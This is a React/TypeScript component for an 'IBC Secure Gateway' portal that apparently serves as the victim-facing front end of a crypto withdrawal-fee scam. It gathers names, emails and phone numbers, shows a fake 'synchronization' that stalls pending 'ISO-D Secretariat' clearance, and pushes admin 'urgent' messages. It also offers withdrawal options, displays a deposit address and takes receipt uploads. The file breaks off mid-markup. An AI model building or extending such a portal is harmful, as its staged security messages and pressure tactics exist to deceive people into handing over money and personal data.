import React, { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Textarea } from "@/components/ui/textarea";
import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home, Copy } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
}

interface CaseLetter {
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionAAmount?: string;
  optionABatches?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBAmount?: string;
  optionBBatches?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
}

interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

interface DepositReceipt {
  id: number;
  caseId: string;
  imageData?: string;
  fileName?: string;
  notes?: string;
  status: string;
  uploadedAt: string;
}

const playNotificationSound = () => {
  const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
  oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.3);
};

export default function SecurePortal() {
  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'dashboard' | 'letter' | 'messages' | 'submissions' | 'success' | 'deposit'>('login');
  
  const [currentCase, setCurrentCase] = useState<Case | null>(null);
  const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [accessCode, setAccessCode] = useState("");
  
  const [regName, setRegName] = useState("");
  const [regEmail, setRegEmail] = useState("");
  const [regMobile, setRegMobile] = useState("");
  
  const [syncProgress, setSyncProgress] = useState(0);
  const [syncStatusText, setSyncStatusText] = useState("Initializing secure handshake...");
  
  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [lastSubmission, setLastSubmission] = useState<Submission | null>(null);
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [unreadCount, setUnreadCount] = useState(0);
  const [isSendingMessage, setIsSendingMessage] = useState(false);
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const lastMessageCountRef = useRef(0);
  const isInitialLoadRef = useRef(true);
  
  // Admin messages
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [selectedMessage, setSelectedMessage] = useState<AdminMessage | null>(null);
  const [unreadAdminMessages, setUnreadAdminMessages] = useState(0);
  
  // Deposit receipts
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  const [uploadingReceipt, setUploadingReceipt] = useState(false);
  const [receiptNotes, setReceiptNotes] = useState("");
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  const { toast } = useToast();

  // Session timeout after 3 minutes of inactivity
  useEffect(() => {
    if (viewState === 'login' || viewState === 'register') return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        setViewState('login');
        setCurrentCase(null);
        setAccessCode("");
        toast({ title: "Session Expired", description: "You have been logged out due to inactivity." });
      }, 3 * 60 * 1000); // 3 minutes
    };

    const handleActivity = () => resetTimeout();

    // Add activity listeners
    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [viewState, toast]);

  // Load all data when case becomes active
  useEffect(() => {
    if (currentCase && viewState !== 'login' && viewState !== 'register' && viewState !== 'sync') {
      loadAllData();
    }
  }, [currentCase, viewState]);

  const loadAllData = async () => {
    if (!currentCase) return;
    
    try {
      const [letterRes, submissionsRes, adminMsgRes, receiptsRes] = await Promise.all([
        fetch(`/api/cases/${currentCase.id}/letter`),
        fetch(`/api/cases/${currentCase.id}/submissions`),
        fetch(`/api/cases/${currentCase.id}/admin-messages`),
        fetch(`/api/cases/${currentCase.id}/deposit-receipts`)
      ]);
      
      if (letterRes.ok) {
        const data = await letterRes.json();
        setLetterContent(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setSubmissions(data);
      }
      
      if (adminMsgRes.ok) {
        const data = await adminMsgRes.json();
        setAdminMessages(data);
        const unread = data.filter((m: AdminMessage) => !m.isRead).length;
        setUnreadAdminMessages(unread);
      }
      
      if (receiptsRes.ok) {
        const data = await receiptsRes.json();
        setDepositReceipts(data);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    }
  };

  // Chat message polling
  useEffect(() => {
    if (!currentCase || viewState === 'login' || viewState === 'register') return;

    const pollMessages = async () => {
      try {
        const res = await fetch(`/api/cases/${currentCase.id}/messages`);
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
          
          const adminMessages = messages.filter((m: ChatMessage) => m.sender === 'admin' && m.isRead === 'false');
          setUnreadCount(adminMessages.length);
          
          // Only show notifications after initial load
          if (!isInitialLoadRef.current && messages.length > lastMessageCountRef.current) {
            const latestMessage = messages[messages.length - 1];
            if (latestMessage.sender === 'admin' && !isChatOpen) {
              playNotificationSound();
              toast({ title: "New Message", description: "You have a new message from support." });
            }
          }
          lastMessageCountRef.current = messages.length;
          
          // Mark initial load complete
          if (isInitialLoadRef.current) {
            isInitialLoadRef.current = false;
          }
        }
      } catch (error) {
        console.error('Failed to poll messages:', error);
      }
    };

    pollMessages();
    const interval = setInterval(pollMessages, 3000);
    return () => clearInterval(interval);
  }, [currentCase, viewState, isChatOpen, toast]);

  // Scroll to bottom when chat opens or new message
  useEffect(() => {
    if (chatScrollRef.current) {
      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
    }
  }, [chatMessages, isChatOpen]);

  // Mark messages as read when chat opens
  useEffect(() => {
    if (isChatOpen && currentCase && unreadCount > 0) {
      fetch(`/api/cases/${currentCase.id}/messages/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'admin' })
      }).then(() => setUnreadCount(0));
    }
  }, [isChatOpen, currentCase, unreadCount]);

  const sendMessage = async () => {
    if (!newMessage.trim() || !currentCase || isSendingMessage) return;
    
    setIsSendingMessage(true);
    try {
      const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'user', message: newMessage.trim() })
      });
      
      if (res.ok) {
        const msg = await res.json();
        setChatMessages(prev => [...prev, msg]);
        setNewMessage("");
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
    }
    setIsSendingMessage(false);
  };

  // Polling for sync status
  useEffect(() => {
    if (viewState !== 'sync' || !currentCase) return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/cases/access/${currentCase.accessCode}`);
        if (response.ok) {
          const updatedCase = await response.json();
          
          if (updatedCase.status === 'active') {
            setCurrentCase(updatedCase);
            setSyncProgress(100);
            setSyncStatusText("Synchronization Complete.");
            setTimeout(() => setViewState('dashboard'), 1000);
          }
        }
      } catch (error) {
        console.error('Failed to poll case status:', error);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [viewState, currentCase]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch(`/api/cases/access/${accessCode}`);
      
      if (response.ok) {
        const foundCase = await response.json();
        setCurrentCase(foundCase);
        
        if (foundCase.status === 'active') setViewState('dashboard');
        else if (foundCase.status === 'syncing') setViewState('sync');
        else if (foundCase.status === 'completed') setViewState('dashboard');
        else setViewState('register');
        
        toast({
          title: "Identity Verified",
          description: "Secure session established.",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      } else {
        toast({
          variant: "destructive",
          title: "Access Denied",
          description: "Invalid clearance code provided.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to verify credentials.",
      });
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCase) return;

    try {
      const response = await fetch(`/api/cases/${currentCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'syncing',
          userName: regName,
          userEmail: regEmail,
          userMobile: regMobile
        })
      });

      if (response.ok) {
        const updatedCase = await response.json();
        setCurrentCase(updatedCase);
        setViewState('sync');
        startSyncSimulation();
      } else {
        toast({
          variant: "destructive",
          title: "Registration Failed",
          description: "Unable to complete registration.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to save registration.",
      });
    }
  };

  const startSyncSimulation = () => {
    let progress = 0;
    const interval = setInterval(() => {
      progress += 5;
      if (progress <= 30) setSyncStatusText("Account phrase key generation process successfully started...");
      else if (progress <= 60) setSyncStatusText("File of customer is now being sorted...");
      else if (progress <= 90) setSyncStatusText("Account information is now being synchronised...");
      else {
        setSyncStatusText("Waiting for Final Clearance from ISO-D Secretariat...");
        clearInterval(interval);
      }
      setSyncProgress(Math.min(progress, 90));
    }, 800);
  };

  const handleSelect = (option: "A" | "B") => {
    setSelectedOption(option);
    setIsConfirming(true);
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);

    if (currentCase && selectedOption) {
      try {
        const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            selectedOption: selectedOption
          })
        });

        if (response.ok) {
          const submission = await response.json();
          setLastSubmission(submission);
          setIsSubmitting(false);
          setIsConfirming(false);
          setViewState('success');
        } else {
          toast({
            variant: "destructive",
            title: "Submission Failed",
            description: "Unable to submit selection.",
          });
          setIsSubmitting(false);
        }
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Connection Error",
          description: "Unable to submit selection.",
        });
        setIsSubmitting(false);
      }
    }
  };

  const markAdminMessageAsRead = async (messageId: number) => {
    try {
      await fetch(`/api/admin-messages/${messageId}/read`, { method: 'POST' });
      setAdminMessages(prev => prev.map(m => m.id === messageId ? { ...m, isRead: true } : m));
      setUnreadAdminMessages(prev => Math.max(0, prev - 1));
    } catch (error) {
      console.error('Failed to mark message as read:', error);
    }
  };

  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file || !currentCase) return;

    setUploadingReceipt(true);
    
    try {
      const reader = new FileReader();
      reader.onload = async (e) => {
        const base64Data = e.target?.result as string;
        
        const response = await fetch(`/api/cases/${currentCase.id}/deposit-receipts`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageData: base64Data,
            fileName: file.name,
            notes: receiptNotes
          })
        });

        if (response.ok) {
          const receipt = await response.json();
          setDepositReceipts(prev => [receipt, ...prev]);
          setReceiptNotes("");
          toast({ title: "Receipt Uploaded", description: "Your deposit receipt has been submitted for review." });
        } else {
          toast({ variant: "destructive", title: "Upload Failed", description: "Unable to upload receipt." });
        }
        setUploadingReceipt(false);
      };
      reader.readAsDataURL(file);
    } catch (error) {
      toast({ variant: "destructive", title: "Upload Error", description: "Failed to process file." });
      setUploadingReceipt(false);
    }
  };

  const hasUrgentMessages = adminMessages.some(m => m.category === 'urgent' && !m.isRead);

  // LOGIN VIEW
  if (viewState === 'login') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
          <div className="text-center mb-8">
            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-logo" />
            <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
            <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
          </div>
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white text-center flex items-center justify-center gap-2">
                <Lock className="w-4 h-4 text-blue-500" /> Verification Required
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Compliance Clearance Reference</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="password" 
                      placeholder="Enter Access Code" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                      value={accessCode}
                      onChange={(e) => setAccessCode(e.target.value)}
                      data-testid="input-access-code"
                    />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-login">Verify Identity</Button>
              </form>
            </CardContent>
            <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
              <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
                 <ShieldCheck className="w-3 h-3" /> 256-bit SSL Encrypted
              </div>
            </CardFooter>
          </Card>
        </motion.div>
      </div>
    );
  }

  // REGISTER VIEW
  if (viewState === 'register') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-md w-full">
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white">Identity Verification</CardTitle>
              <p className="text-slate-400 text-sm mt-1">Please confirm your contact details for the secure ledger.</p>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleRegister} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
                  <div className="relative">
                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="Your full legal name" data-testid="input-name" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" data-testid="input-email" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
                  <div className="relative">
                    <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="Your contact number" data-testid="input-mobile" />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4" data-testid="button-register">
                  Proceed to Secure Synchronization
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }

  // SYNC VIEW
  if (viewState === 'sync') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-md w-full text-center">
          <div className="mb-8 relative">
             <div className="w-24 h-24 rounded-full border-4 border-blue-500/30 border-t-blue-500 animate-spin mx-auto"></div>
             <div className="absolute inset-0 flex items-center justify-center">
               <Lock className="w-8 h-8 text-blue-500" />
             </div>
          </div>
          
          <h2 className="text-2xl font-bold text-white mb-2">Synchronizing Account</h2>
          <p className="text-slate-400 text-sm mb-8 h-6">{syncStatusText}</p>
          
          <div className="bg-slate-800 rounded-full h-2 mb-2 overflow-hidden">
            <motion.div 
              className="h-full bg-blue-500" 
              initial={{ width: "0%" }}
              animate={{ width: `${syncProgress}%` }}
              transition={{ duration: 0.5 }}
            />
          </div>
          <div className="flex justify-between text-xs text-slate-500 font-mono">
            <span>ISO-D PROTOCOL</span>
            <span>{syncProgress}%</span>
          </div>

          {syncProgress >= 90 && (
             <div className="mt-8 p-4 bg-amber-500/10 border border-amber-500/20 rounded text-amber-400 text-xs animate-pulse">
               Wait for administrative clearance...
             </div>
          )}
        </motion.div>
      </div>
    );
  }

  // DASHBOARD VIEW
  if (viewState === 'dashboard') {
    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
    const processingMessages = adminMessages.filter(m => m.category === 'processing');
    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');

    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
        {/* Header */}
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
            <div className="flex justify-between items-center">
              <div className="flex items-center gap-3">
                <img src={ibcLogo} alt="IBC" className="h-10 w-10 object-contain" />
                <div>
                  <h1 className="font-bold text-lg">IBC SECURE GATEWAY</h1>
                  <p className="text-xs text-blue-200 uppercase tracking-wide">Member Dashboard</p>
                </div>
              </div>
              <div className="flex items-center gap-4">
                {hasUrgentMessages && (
                  <div className="animate-pulse flex items-center gap-2 bg-red-500 px-3 py-1 rounded-full text-sm font-bold">
                    <AlertTriangle className="w-4 h-4" />
                    URGENT
                  </div>
                )}
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="text-white hover:bg-white/10"
                  onClick={() => { setViewState('login'); setCurrentCase(null); }}
                  data-testid="button-logout"
                >
                  Sign Out
                </Button>
              </div>
            </div>
          </div>
        </nav>

        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {/* Welcome Section */}
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8">
            <h2 className="text-3xl font-serif font-bold text-slate-900 mb-2">
              Welcome, {currentCase?.userName || 'Member'}
            </h2>
            <p className="text-slate-600">Reference: IBC-AML-CC-{currentCase?.accessCode}</p>
          </motion.div>

          {/* Requirement Alert */}
          {(currentCase?.hasRequirements || hasUrgentMessages) && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }} 
              animate={{ opacity: 1, scale: 1 }}
              className="mb-8 p-4 bg-red-50 border-2 border-red-200 rounded-lg flex items-center gap-4"
            >
              <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <AlertTriangle className="w-6 h-6 text-red-600" />
              </div>
              <div>
                <h3 className="font-bold text-red-900">Action Required</h3>
                <p className="text-red-700 text-sm">You have pending requirements from IBC. Please check your messages.</p>
              </div>
            </motion.div>
          )}

          {/* Main Grid */}
          <div className="grid lg:grid-cols-3 gap-6">
            {/* Required Actions Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('messages')} data-testid="card-required-actions">
                <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-t-lg">
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <Bell className="w-5 h-5" />
                      Required Actions
                    </CardTitle>
                    {unreadAdminMessages > 0 && (
                      <Badge className="bg-red-500 text-white animate-pulse">{unreadAdminMessages}</Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent className="pt-6">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-red-600">
                        <AlertTriangle className="w-4 h-4" /> Urgent
                      </span>
                      <Badge variant={urgentMessages.length > 0 ? "destructive" : "secondary"}>{urgentMessages.length}</Badge>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-amber-600">
                        <Clock className="w-4 h-4" /> Processing
                      </span>
                      <Badge variant="outline">{processingMessages.length}</Badge>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-green-600">
                        <CheckCircle className="w-4 h-4" /> Resolved
                      </span>
                      <Badge variant="outline">{resolvedMessages.length}</Badge>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View Messages</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Withdrawal Letter Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('letter')} data-testid="card-withdrawal-letter">
                <CardHeader className="bg-gradient-to-r from-emerald-500 to-emerald-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <FileText className="w-5 h-5" />
                    Withdrawal Letter
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    Review your withdrawal options and select your preferred method.
                  </p>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Status</span>
                      <Badge variant={currentCase?.status === 'completed' ? 'default' : 'outline'}>
                        {currentCase?.status === 'completed' ? 'Submitted' : 'Pending'}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Submissions</span>
                      <span className="font-semibold">{submissions.length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View Letter</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Profile Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
              <Card className="h-full hover:shadow-lg transition-shadow border-2 border-transparent hover:border-primary/20">
                <CardHeader className="bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <User className="w-5 h-5" />
                    Profile Information
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Name</span>
                      <span className="font-semibold">{currentCase?.userName}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Email</span>
                      <span className="font-semibold text-xs">{currentCase?.userEmail}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">VIP Status</span>
                      <Badge className="bg-amber-100 text-amber-700">{currentCase?.vipStatus || 'Standard'}</Badge>
                    </div>
                    {currentCase?.depositAddress && (
                      <div className="pt-2 border-t">
                        <span className="text-slate-500 text-xs block mb-1">Deposit Address</span>
                        <code className="text-xs bg-slate-100 p-2 rounded block break-all">{currentCase.depositAddress}</code>
                      </div>
                    )}
                  </div>
                  {currentCase?.profileRedirectUrl && (
                    <Button 
                      className="w-full mt-6" 
                      variant="outline"
                      onClick={() => window.open(currentCase.profileRedirectUrl, '_blank')}
                    >
                      <ExternalLink className="w-4 h-4 mr-2" />
                      Open Profile Link
                    </Button>
                  )}
                </CardContent>
              </Card>
            </motion.div>

            {/* Deposit Section Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('deposit')} data-testid="card-deposit">
                <CardHeader className="bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <Wallet className="w-5 h-5" />
                    Deposit & Receipts
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    Upload your deposit receipts and track their status.
                  </p>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Receipts Uploaded</span>
                      <span className="font-semibold">{depositReceipts.length}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Pending Review</span>
                      <span className="font-semibold">{depositReceipts.filter(r => r.status === 'pending').length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">Manage Deposits</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Submission History Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('submissions')} data-testid="card-history">
                <CardHeader className="bg-gradient-to-r from-slate-600 to-slate-700 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <History className="w-5 h-5" />
                    Submission History
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    View all your previous submissions and their status.
                  </p>
                  <div className="text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Total Submissions</span>
                      <span className="font-semibold">{submissions.length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View History</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* IBC Support Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setIsChatOpen(true)} data-testid="card-support">
                <CardHeader className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white rounded-t-lg">
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <MessageCircle className="w-5 h-5" />
                      IBC Support
                    </CardTitle>
                    {unreadCount > 0 && (
                      <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    Chat with IBC support for assistance with your account.
                  </p>
                  <Button className="w-full mt-6" variant="outline">
                    <MessageCircle className="w-4 h-4 mr-2" />
                    Open Chat
                  </Button>
                </CardContent>
              </Card>
            </motion.div>
          </div>
        </main>

        {/* Floating Chat Button */}
        <motion.button
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          whileHover={{ scale: 1.1 }}
          className="fixed bottom-6 right-6 w-16 h-16 bg-primary text-white rounded-full shadow-2xl flex items-center justify-center z-50"
          onClick={() => setIsChatOpen(true)}
          data-testid="button-chat-float"
        >
          <MessageCircle className="w-7 h-7" />
          {unreadCount > 0 && (
            <span className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full text-xs flex items-center justify-center font-bold">
              {unreadCount}
            </span>
          )}
        </motion.button>

        {/* Chat Dialog - will be rendered at the end */}
      </div>
    );
  }

  // MESSAGES VIEW
  if (viewState === 'messages') {
    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
    const processingMessages = adminMessages.filter(m => m.category === 'processing');
    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');

    return (
      <div className="min-h-screen bg-slate-50">
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="font-bold">Required Actions</h1>
              <p className="text-xs text-blue-200">View messages from IBC</p>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto px-4 py-8">
          {/* Urgent Messages */}
          {urgentMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-red-600 flex items-center gap-2 mb-4">
                <AlertTriangle className="w-5 h-5 animate-pulse" />
                Urgent
              </h2>
              <div className="space-y-4">
                {urgentMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className={`border-2 ${!msg.isRead ? 'border-red-400 bg-red-50' : 'border-red-200'} cursor-pointer hover:shadow-lg transition-all`}
